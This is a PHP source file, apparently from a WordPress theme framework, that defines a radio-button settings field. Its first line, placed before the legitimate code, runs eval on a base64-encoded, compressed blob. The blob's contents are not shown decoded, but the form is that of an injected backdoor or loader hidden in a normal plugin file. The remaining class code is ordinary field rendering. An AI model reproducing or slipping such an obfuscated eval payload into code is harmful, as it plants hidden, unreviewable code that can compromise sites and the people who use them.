<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionReduxFramework_radio' ) ) {
		class FusionReduxFramework_radio {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function render() {

				if ( ! empty( $this->field['data'] ) && empty( $this->field['options'] ) ) {
					if ( empty( $this->field['args'] ) ) {
						$this->field['args'] = array();
					}
					$this->field['options'] = $this->parent->get_wordpress_data( $this->field['data'], $this->field['args'] );
				}

				$this->field['data_class'] = ( isset( $this->field['multi_layout'] ) ) ? 'data-' . $this->field['multi_layout'] : 'data-full';

				if ( ! empty( $this->field['options'] ) ) {
					echo '<ul class="' . $this->field['data_class'] . '">';

					foreach ( $this->field['options'] as $k => $v ) {
						echo '<li>';
						echo '<label for="' . $this->field['id'] . '_' . array_search( $k, array_keys( $this->field['options'] ) ) . '">';
						echo '<input type="radio" class="radio ' . $this->field['class'] . '" id="' . $this->field['id'] . '_' . array_search( $k, array_keys( $this->field['options'] ) ) . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" value="' . $k . '" ' . checked( $this->value, $k, false ) . '/>';
						echo ' <span>' . $v . '</span>';
						echo '</label>';
						echo '</li>';
					}
					//foreach

					echo '</ul>';
				}
			} //function
		} //class
	}